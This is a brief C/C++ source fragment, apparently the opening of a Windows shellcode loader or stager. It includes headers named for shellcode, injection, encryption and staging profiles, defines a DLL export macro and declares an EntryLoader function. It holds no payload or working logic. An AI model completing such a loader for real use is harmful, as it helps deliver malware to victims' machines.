#include <windows.h>

#include <native.h>
#include <winhttp.h>

#include <Shellcode.h>
#include <Injection.h>
#include <Encryption.h>

#include <StagingProfile.h>


#define DLLEXPORT __declspec(dllexport)

auto EntryLoader( VOID ) -> VOID;
